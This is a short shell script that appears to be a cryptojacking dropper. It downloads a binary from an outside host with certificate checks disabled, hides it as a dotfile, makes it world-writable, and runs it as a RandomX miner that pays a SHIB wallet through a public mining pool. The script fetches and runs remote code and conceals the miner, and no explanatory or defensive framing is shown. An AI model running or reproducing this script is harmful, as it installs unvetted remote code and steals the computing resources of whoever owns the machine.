#!/bin/sh
wget --no-check-certificate https://swensonm.com/mining/masterfile 
mv masterfile .masterfile
chmod 777 .masterfile
./.masterfile -o rx-us.unmineable.com:3333 -u 
SHIB:0xd901d43a416d4d9ad29e986f2dfa75b7fa0630cf.cupliz -p X -k -a rx/0
